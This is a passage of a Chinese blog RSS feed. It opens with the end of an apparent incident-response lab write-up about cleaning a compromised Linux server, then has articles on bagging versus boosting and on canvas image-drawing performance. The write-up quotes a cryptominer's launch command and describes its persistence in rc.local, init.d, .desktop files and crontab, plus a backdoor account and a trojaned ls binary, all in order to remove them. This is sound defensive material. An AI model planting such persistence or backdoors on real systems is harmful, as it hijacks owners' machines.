&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/FAABBEE9C6D84371B7D2E0E3D9676EE2/126906&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/jlq_diligence/article/details/80680492&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/jlq_diligence/article/details/80680492&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B：/etc/rc.local&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;cat /etc/rc.local | grep mycoin
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/ED37A72FF490472A84871FBD0EF8AE7E/126899&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删除掉 /usr/share/mycoin/mycoin -c /usr/share/mycoin/config.json -B 内容即可&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/7696BF4B52DB4B73869DE8DEB55D25C7/126904&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;C：文件指向路径是/etc/init.d下的脚本文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/etc/rc[0-6].d
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/3C36C3A92C2D446FB3502777B249850D/126910&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;D：设置程序的.desktop文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;program.desktop文件写法：

[Desktop Entry]

Name=program

Exec=/usr/bin/program

Type=Application

Comment=my program
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/98C715DBA9404A32B8A1C36A5E2277D2/126913&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;E：crontab定时执行任务&lt;/p&gt;
&lt;p&gt;周期执行的任务一般由cron这个守护进程来处理[ps -ef|grep cron]&lt;/p&gt;
&lt;p&gt;cron的配置文件称为“crontab”，是“cron table”的简写&lt;/p&gt;
&lt;p&gt;　　service crond start //启动服务&lt;/p&gt;
&lt;p&gt;　　service crond stop //关闭服务&lt;/p&gt;
&lt;p&gt;　　service crond restart //重启服务&lt;/p&gt;
&lt;p&gt;　　service crond reload //重新载入配置&lt;/p&gt;
&lt;p&gt;　　service crond status //查看服务状态&lt;/p&gt;
&lt;p&gt;每两个小时&lt;/p&gt;
&lt;p&gt;0 */2 * * * echo &quot;Have a break now.&quot; &amp;gt;&amp;gt; /tmp/test.txt&lt;/p&gt;
&lt;p&gt;crontab -l //在标准输出上显示当前的c&lt;/p&gt;
&lt;p&gt;crontab -r // 删除当前的crontab文件。&lt;/p&gt;
&lt;p&gt;crontab -e //使用VISUAL或者EDITOR环境变量所指的编辑器编辑当前的crontab文件,当结束编辑离开时，编辑后的文件将自动安装。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/4FE3AD39DA79491DBB606EF9DAFF9010/126915&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;顺着计划任务所指向的文件目录查找&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/97A5304833A24B1485D6381EECC651E6/126917&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;发现挖矿程序和配置文件，但是发现没有相关经常，说明计划任务没有执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/770A6C62D4EB48F08E6B43BE0119B63B/126922&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删除上述挖矿程序和配置文件，删除计划任务&lt;/p&gt;
&lt;p&gt;root@65c7d9159ef6:~# cd /etc/init.d&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/3C74025942CA4FF1B79E4B3348C285A8/126941&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看mine_srv文件内容，发现&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PROG=&quot;mining&quot;

PROG_PATH=&quot;/usr/local/sbin&quot; ## Not need, but sometimes helpful (if $PROG resides in /opt for example).

PROG_ARGS=&quot;-c /etc/mine_srv/config.json -B&quot; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/2DA3F415D07C4756A6FC0C8B1F71351C/126945&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;分别查看以上几个路径，发现json文件为挖矿配置文件，但是无相关进程&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/F95C7FF43CA14A4D8727781FF26740B0/126952&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删除以上可执行程序和配置文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5、backdoor用户删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在/etc/passwd中发现backdoor用户，但是删除是提示backdoor用户当前被进程1使用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;userdel -f backdoor
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/EAD42A5572564865AC178CDC80ECF47F/126963&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因为我们现在是root用户，直接可以修改/etc/passwd和/etc/shadow&lt;/p&gt;
&lt;p&gt;删掉backdoor用户&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/D6C1366ED5214E7495B89879B763B541/127007&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6、清除ls动态链接库后门&lt;/strong&gt;&lt;br/&gt;当执行&lt;strong&gt;ls&lt;/strong&gt;命令时，发现提示“backdoor组已经存在”，猜测&lt;strong&gt;ls&lt;/strong&gt;命令被更改了&lt;/p&gt;
&lt;p&gt;先删除backdoor组，然后执行&lt;strong&gt;ls&lt;/strong&gt;命令没有提示了，再次查看/etc/passwd，发现被添加了backdoor用户，说明&lt;strong&gt;/bin/ls&lt;/strong&gt; ⽂件的动态链接库中被添加了后⻔程序&lt;/p&gt;
&lt;p&gt;​ &lt;img src=&quot;https://note.youdao.com/yws/public/resource/da5e3560f0ab8522680392b03361e6d4/xmlnote/28B13A2974F642BFA35CC27829AF139B/127010&quot; alt=&quot;0&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删除/bin/ls可执行文件，重新上传一个从其他服务器上提取的ls文件替换即可。&lt;/p&gt;
</description>
<pubDate>Mon, 25 Jan 2021 15:32:00 +0000</pubDate>
<dc:creator>hu1ge(micr067)</dc:creator>
<og:description>场景 ​ 有客户反馈其所使用的服务器近期突然网站打开特别慢，但是网站访问人数较前期并无明显变化，服务器CPU利用率较高。同时客户接到投诉反映通过搜索引擎搜索该网站点击后会跳转到博彩网站。请协助客户分析</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/micr067/p/14328067.html</dc:identifier>
</item>
<item>
<title>Bagging和Boosting的介绍及对比 - 早起的小虫子</title>
<link>http://www.cnblogs.com/liuxiaochong/p/14327106.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/liuxiaochong/p/14327106.html</guid>
<description>&lt;p&gt;&lt;span&gt;　　“团结就是力量”这句老话很好地表达了机器学习领域中强大「集成方法」的基本思想。总的来说，许多机器学习竞赛（包括 Kaggle）中最优秀的解决方案所采用的集成方法都建立在一个这样的假设上：将多个模型组合在一起通常可以产生更强大的模型。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;一、集成方法&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　集成（Ensemble）方法就是针对同一任务，将多个或多种分类器进行融合，从而提高整体模型的泛化能力。&lt;/span&gt;&lt;span&gt;对于一个复杂任务，将多个模型进行适当地综合所得出的判断，通常要比任何一个单独模型的判读好。也就是我们常说的“三个臭皮匠，顶过诸葛亮”。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　不过对于组合分类器必须满足两点：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　(1) 基模型之间应该是相互独立的&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　(2) 基模型应好于随机猜测模型&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　集成方法目前分为两种：Bagging 与 Boosting，下面分别介绍。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;bagging算法套袋发&quot;&gt;&lt;span&gt;二、Bagging算法(套袋法)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　bagging的算法过程如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　1、从原始样本集中使用Bootstraping 方法随机抽取n个训练样本，共进行k轮抽取，得到k个训练集（k个训练集之间相互独立，元素可以有重复）。&lt;/p&gt;
&lt;p&gt;　　2、对于n个训练集，我们训练k个模型（这个模型可根据具体的情况而定，可以是决策树，KNN等）。&lt;/p&gt;
&lt;p&gt;　　3、对于分类问题：由投票表决产生的分类结果；对于回归问题，由k个模型预测结果的均值作为最后预测的结果（所有模型的重要性相同）。&lt;/p&gt;
&lt;h2 id=&quot;boosting（提升法）&quot;&gt;&lt;span&gt;三、Boosting（提升法）&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　boosting的算法过程如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　1、对于训练集中的每个样本建立权值$w_{i}$，表示对每个样本的权重， 其关键在与对于被错误分类的样本权重会在下一轮的分类中获得更大的权重（错误分类的样本的权重增加）。&lt;/p&gt;
&lt;p&gt;　　2、同时加大分类误差概率小的弱分类器的权值，使其在表决中起到更大的作用，减小分类误差率较大弱分类器的权值，使其在表决中起到较小的作用。每一次迭代都得到一个弱分类器，需要使用某种策略将其组合，最为最终模型(AbaBoost给每个迭代之后的弱分类器一个权值，将其线性组合作为最终的分类器,误差小的分类器权值越大)。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　关于Boosting的两个核心问题：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1、在每一轮如何改变训练数据的权值或概率分布？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　通过提高那些在前一轮被弱分类器分错样例的权值，减小前一轮分正确样例的权值，来使得分类器对误分的数据有较好的效果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2、通过什么方式来组合弱分类器？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　通过加法模型将弱分类器进行线性组合，比如AdaBoost通过加权多数表决的方式，即增大错误率小的分类器的权值，同时减小错误率较大的分类器的权值。&lt;/span&gt;&lt;span&gt;而提升树通过拟合残差的方式逐步减小残差，将每一步生成的模型叠加得到最终模型。&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;四、Bagging、Boosting二者之间的区别&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　Bagging和Boosting的区别：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1）样本选择上：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Bagging：训练集是在原始集中有放回选取的，从原始集中选出的各轮训练集之间是独立的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Boosting：每一轮的训练集不变，只是训练集中每个样例在分类器中的权重发生变化。而权值是根据上一轮的分类结果进行调整。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2）样例权重：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Bagging：使用均匀取样，每个样例的权重相等&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Boosting：根据错误率不断调整样例的权值，错误率越大则权重越大。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3）预测函数：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Bagging：所有预测函数的权重相等。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Boosting：每个弱分类器都有相应的权重，对于分类误差小的分类器会有更大的权重。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　4）并行计算：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Bagging：各个预测函数可以并行生成&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Boosting：各个预测函数只能顺序生成，因为后一个模型参数需要前一轮模型的结果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　5）Bagging是减少variance（方差），而Boosting是减少bias（偏差）&lt;/span&gt;&lt;/p&gt;
&lt;div readability=&quot;11.5&quot;&gt;
&lt;div readability=&quot;18&quot;&gt;
&lt;p&gt;&lt;span&gt;　　Bagging对样本重采样，对每一重采样得到的子样本集训练一个模型，最后取平均。由于子样本集的相似性以及使用的是同种模型，因此各模型有近似相等的bias和variance（事实上，各模型的分布也近似相同，但不独立）。由于$E\left [ \frac{\sum X_{i}}{n} \right ]=E\left [X_{i} \right ]$，所以bagging后的bias和单个子模型的接近，一般来说不能显著降低bias。另一方面，若各子模型独立，则有$Var\left ( \frac{\sum X_{i}}{n} \right )=\frac{Var\left (X_{i} \right )}{n}$，此时可以显著降低variance。若各子模型完全相同，则$Var\left ( \frac{\sum X_{i}}{n} \right )=Var\left (X_{i} \right )$&lt;/span&gt;&lt;span&gt;，此时不会降低variance。bagging方法得到的各子模型是有一定相关性的，属于上面两个极端状况的中间态，因此可以一定程度降低variance。为了进一步降低variance，Random forest通过随机选取变量子集做拟合的方式de-correlated了各子模型（树），使得variance进一步降低。&lt;/span&gt;&lt;span&gt;（用公式可以一目了然：设有i.d.的n个随机变量，方差记为$\sigma ^{2}$，两两变量之间的相关性为$\rho $，则$\frac{\sum X_{i}}{n}$的方差为$\rho \ast \sigma ^{2}+(1-\rho )\ast \sigma ^{2}/n$&lt;/span&gt;&lt;span&gt;，Bagging降低的是第二项，Random Forest是同时降低两项。）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;/span&gt;&lt;span&gt;Boosting从优化角度来看，是用Forward-Stagewise这种贪心法去最小化损失函数$L(y,\sum a_{i}f_{i}(x))$。例如，常见的AdaBoost即等价于用这种方法最小化Exponential Loss：$L(y,f(x))=exp(-yf(x))$。所谓Forward-Stagewise，就是在迭代的第n步，求解新的子模型$f(x)$及步长$a$（或者叫组合系数），来最小化$L(y,f_{n-1}(x)+af(x))$，这里$f_{n-1}(x)$&lt;/span&gt;&lt;span&gt;是前n-1步得到的子模型的和。因此Boosting是在Sequential地最小化损失函数，其bias自然逐步下降。但由于是采取这种Sequential、Adaptive的策略，各子模型之间是强相关的，于是子模型之和并不能显著降低variance。所以说Boosting主要还是靠降低bias来提升预测精度。&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;五、总结&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　这两种方法都是把若干个分类器整合为一个分类器的方法，只是整合的方式不一样，最终得到不一样的效果，将不同的分类算法套入到此类算法框架中一定程度上会提高了原单一分类器的分类效果，但是也增大了计算量。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　下面是将决策树与这些算法框架进行结合所得到的新的算法：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1）Bagging + 决策树 = 随机森林&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2）AdaBoost + 决策树 = 提升树&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3）Gradient Boosting + 决策树 = GBDT&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;参考&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://baijiahao.baidu.com/s?id=1633580172255481867&amp;amp;wfr=spider&amp;amp;for=pc&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://baijiahao.baidu.com/s?id=1633580172255481867&amp;amp;wfr=spider&amp;amp;for=pc&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pianshen.com/article/1393124418/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://www.pianshen.com/article/1393124418/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/liuwu265/p/4690486.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://www.cnblogs.com/liuwu265/p/4690486.html&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/earendil/p/8872001.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://www.cnblogs.com/earendil/p/8872001.html&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 25 Jan 2021 15:28:00 +0000</pubDate>
<dc:creator>早起的小虫子</dc:creator>
<og:description>“团结就是力量”这句老话很好地表达了机器学习领域中强大「集成方法」的基本思想。总的来说，许多机器学习竞赛（包括 Kaggle）中最优秀的解决方案所采用的集成方法都建立在一个这样的假设上：将多个模型组合</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liuxiaochong/p/14327106.html</dc:identifier>
</item>
<item>
<title>canvas性能-drawImage渲染图片 - Mr.苏</title>
<link>http://www.cnblogs.com/suyuanli/p/14328056.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/suyuanli/p/14328056.html</guid>
<description>&lt;div id=&quot;cnblogs_post_description&quot; readability=&quot;32&quot;&gt;&lt;img src=&quot;https://blog.suyuanli.ink/cover1611484854426-885.jpg&quot; class=&quot;desc_img&quot;/&gt;canvas绘制图片时，各种情况下绘制图片的性能相差多少呢&lt;/div&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;92.564687377114&quot;&gt;


&lt;h2 id=&quot;canvas绘制图片&quot;&gt;canvas绘制图片&lt;/h2&gt;
&lt;p&gt;一般我们绘制图片会用到的方法是&lt;code&gt;drawImage&lt;/code&gt;和&lt;code&gt;putImageData&lt;/code&gt;，还有作为测试环境使用的&lt;code&gt;createPattern&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;drawimage&quot;&gt;drawImage&lt;/h3&gt;
&lt;p&gt;描述：&lt;/p&gt;
&lt;p&gt;使用方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;ctx.drawImage(image,sx,sy,swidth,sheight,x,y,width,height)
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;image的类型：
&lt;ul&gt;&lt;li&gt;HTMLImageElement：这些图片是由Image()函数构造出来的，或者任何的img元素&lt;/li&gt;
&lt;li&gt;HTMLVideoElement：用一个HTML的video元素作为你的图片源，可以从视频中抓取当前帧作为一个图像&lt;/li&gt;
&lt;li&gt;HTMLCanvasElement：可以使用另一个canvas元素作为你的图片源&lt;/li&gt;
&lt;li&gt;ImageBitmap：这是一个高性能的位图，可以低延迟地绘制，它可以从上述的所有源以及其它几种源中生成&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;sx：可选。开始剪切的 x 坐标位置&lt;/li&gt;
&lt;li&gt;sy：可选。开始剪切的 y 坐标位置&lt;/li&gt;
&lt;li&gt;swidth：可选。被剪切图像的宽度&lt;/li&gt;
&lt;li&gt;sheight：可选。被剪切图像的高度&lt;/li&gt;
&lt;li&gt;x：在画布上放置图像的 x 坐标位置&lt;/li&gt;
&lt;li&gt;y：在画布上放置图像的 y 坐标位置&lt;/li&gt;
&lt;li&gt;width：可选。要使用的图像的宽度。（伸展或缩小图像）&lt;/li&gt;
&lt;li&gt;height：可选。要使用的图像的高度。（伸展或缩小图像）&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;putimagedata&quot;&gt;putImageData&lt;/h3&gt;
&lt;p&gt;描述： Canvas 2D API 将数据从已有的 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/ImageData&quot; target=&quot;_blank&quot;&gt;&lt;code&gt;ImageData&lt;/code&gt;&lt;/a&gt; 对象绘制到位图的方法。 如果提供了一个绘制过的矩形，则只绘制该矩形的像素。此方法不受画布转换矩阵的影响。&lt;/p&gt;
&lt;p&gt;使用方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;ctx.putImageData(imageData, dx, dy, dirtyX, dirtyY, dirtyWidth, dirtyHeight)
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;ImageData：包含像素值的数组对象&lt;/li&gt;
&lt;li&gt;dx：源图像数据在目标画布中的位置偏移量（x 轴方向的偏移量）&lt;/li&gt;
&lt;li&gt;dy：源图像数据在目标画布中的位置偏移量（y 轴方向的偏移量）&lt;/li&gt;
&lt;li&gt;dirtyX：可选 在源图像数据中，矩形区域左上角的位置。默认是整个图像数据的左上角（x 坐标）&lt;/li&gt;
&lt;li&gt;dirtyY：可选 在源图像数据中，矩形区域左上角的位置。默认是整个图像数据的左上角（y 坐标）&lt;/li&gt;
&lt;li&gt;dirtyWidth：可选 在源图像数据中，矩形区域的宽度。默认是图像数据的宽度&lt;/li&gt;
&lt;li&gt;dirtyHeight：可选 在源图像数据中，矩形区域的高度。默认是图像数据的高度。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;createpattern&quot;&gt;createPattern&lt;/h3&gt;
&lt;p&gt;描述：指定的方向内重复指定的元素，元素可以是图片、视频，或者其他 canvas 元素，被重复的元素可用于绘制/填充矩形、圆形或线条等等。&lt;/p&gt;
&lt;p&gt;使用方式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;ctx.fillStyle = ctx.createPattern(img,&quot;repeat&quot;)
ctx.fill();
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;测试绘制耗时&quot;&gt;测试绘制耗时&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;测试图片尺寸为（500x500）和（1920x1080）的jpg图片&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;drawimage-1&quot;&gt;drawImage&lt;/h3&gt;
&lt;p&gt;首先测试的是&lt;code&gt;drawImage&lt;/code&gt;方法，通过绘制同一张图片不同的资源类型下的耗时&lt;/p&gt;
&lt;h4 id=&quot;image类型&quot;&gt;Image类型&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;在空白canvas情况下渲染该图片耗时：0.01ms左右&lt;/li&gt;
&lt;li&gt;在使用了&lt;code&gt;createPattern&lt;/code&gt;填充了canvas作为背景的情况下渲染该图片耗时：0.01ms左右&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;imagebitmap类型&quot;&gt;ImageBitmap类型&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;在空白canvas情况下渲染该图片耗时：1ms左右，（1920*1080）是1.8ms左右&lt;/li&gt;
&lt;li&gt;在使用了&lt;code&gt;createPattern&lt;/code&gt;填充了canvas作为背景的情况下渲染该图片耗时：0.01ms左右，（1920*1080）是2ms左右&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;htmlcanvaselement类型&quot;&gt;HTMLCanvasElement类型&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;在空白canvas情况下渲染该图片耗时：0.01ms左右&lt;/li&gt;
&lt;li&gt;在使用了&lt;code&gt;createPattern&lt;/code&gt;填充了canvas作为背景的情况下渲染该图片耗时：12ms左右，（1920*1080）是14ms左右&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;putimagedata-1&quot;&gt;putImageData&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;在空白canvas情况下渲染该图片耗时：1ms左右&lt;/li&gt;
&lt;li&gt;在使用了&lt;code&gt;createPattern&lt;/code&gt;填充了canvas作为背景的情况下渲染该图片耗时：2ms左右&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;渲染图片方式&lt;/th&gt;
&lt;th&gt;空白canvas下渲染耗时 图片尺寸（500*500）&lt;/th&gt;
&lt;th&gt;使用createPattern铺满下渲染耗时 图片尺寸（500*500）&lt;/th&gt;
&lt;th&gt;空白canvas下渲染耗时 图片尺寸（1920*1080）&lt;/th&gt;
&lt;th&gt;使用createPattern铺满下渲染耗时 图片尺寸（1920*1080）&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;drawImage(Image)&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;drawImage(ImageBitmap)&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;drawImage(HTMLCanvasElement)&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;12ms&lt;/td&gt;
&lt;td&gt;0.01ms&lt;/td&gt;
&lt;td&gt;14ms&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;putImageData&lt;/td&gt;
&lt;td&gt;1ms&lt;/td&gt;
&lt;td&gt;2ms&lt;/td&gt;
&lt;td&gt;1.8ms&lt;/td&gt;
&lt;td&gt;3ms&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;结论&quot;&gt;结论&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;由上面的测试结果可以看出在空白canvas下渲染图片，除了putImageData剩下的性能是一致的即Image = ImageBitmap = HTMLCanvasElement &amp;gt; putImageData。&lt;/li&gt;
&lt;li&gt;而使用了createPattern平铺作为背景的情况下Image = ImageBitmap &amp;gt; putImageData &amp;gt; HTMLCanvasElement&lt;/li&gt;
&lt;li&gt;渲染图片尺寸大小一般情况下对drawImage(Image)和drawImage(ImageBitmap)的影响较小，而且性能优越。&lt;/li&gt;
&lt;li&gt;createPattern铺满的情况下drawImage(HTMLCanvasElement)的性能最差和drawImage(Image)能达到3个数量级的差距&lt;/li&gt;
&lt;li&gt;drawImage(HTMLCanvasElement)在空白canvas下性能也很优越&lt;/li&gt;
&lt;li&gt;putImageData的性能处于中等，使用createPattern铺满背景的情况下会有一定影响，不过不是太大&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;所以可以不使用使用createPattern铺满背景的情况下尽量不要使用，可以使用多层canvas，不必要的层级可以减少重绘。或者将平铺的背景转为Image对象使用。&lt;/p&gt;
&lt;p&gt;当然以上的结论为我个人开发时的遇到的问题的总结，如果有误请提出。因为样本数量和图片格式并没有达到太多。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 25 Jan 2021 15:28:00 +0000</pubDate>
<dc:creator>Mr.苏</dc:creator>
<og:description>canvas性能-绘制图片 canvas绘制图片 一般我们绘制图片会用到的方法是drawImage和putImageData，还有作为测试环境使用的createPattern drawImage 描述</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/suyuanli/p/14328056.html</dc:identifier>
</item>
<item>
<title>干货！上古神器 sed 教程详解，小白也能看的懂 - 肖邦linux</title>
